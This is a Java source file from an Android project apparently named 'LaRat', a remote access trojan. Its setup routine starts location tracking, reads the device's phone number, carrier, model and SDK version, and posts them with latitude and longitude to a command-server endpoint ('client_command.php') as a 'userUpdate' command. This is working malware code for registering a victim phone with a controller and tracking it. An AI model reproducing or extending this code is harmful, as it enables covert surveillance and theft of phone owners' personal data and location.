package com.c4wd.larat;

/**
 * Created by cory on 10/4/15.
 */

import android.content.Context;
import android.os.StrictMode;
import android.telephony.TelephonyManager;


import com.loopj.android.http.RequestParams;
import com.parse.ParseInstallation;

/**
 * Created by Cory on 8/10/2015.
 */
public class Constants {

    public static String CLIENT_ID;
    public static String PHONE_NUMBER;
    public static String DEVICE_ID;
    public static String SDK_VERSION;
    public static String PROVIDER;
    public static boolean IS_SETUP = false;

    public static void setupInternals(Context context) {
        TelephonyManager telephonyManager =((TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE));
        LaRatLocationManager.startLocationService(context);

        CLIENT_ID = ParseInstallation.getCurrentInstallation().getObjectId();
        DEVICE_ID = android.os.Build.MODEL;
        DEVICE_ID = DEVICE_ID.replace(" ", "");
        SDK_VERSION = Integer.valueOf(android.os.Build.VERSION.SDK).toString();
        PROVIDER = telephonyManager.getNetworkOperatorName();
        if(PROVIDER.startsWith("Searching"))
            PROVIDER = null;
        if(PROVIDER == null || PROVIDER.length() < 2)
            PROVIDER = "Not Activated";
        PROVIDER = PROVIDER.replace(" ", "_");
        PHONE_NUMBER = telephonyManager.getLine1Number();
        userUpdate();

        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);
        IS_SETUP = true;
    }

    public static void userUpdate() {
        RequestParams params = new RequestParams();
        params.put("command", "userUpdate");
        params.put("client_id", CLIENT_ID);
        params.put("carrier", PROVIDER);
        params.put("phoneNumber", PHONE_NUMBER);
        params.put("deviceid", DEVICE_ID);
        params.put("sdkversion", SDK_VERSION);
        if(LaRatLocationManager.LAST_LOCATION != null) {
            params.put("latitude", LaRatLocationManager.LAST_LOCATION.getLatitude());
            params.put("longitude", LaRatLocationManager.LAST_LOCATION.getLongitude());
        } else {
            params.put("latitude", 0.0);
            params.put("longitude", 0.0);
        }
        RestClient.post("client_command.php", params);
    }
}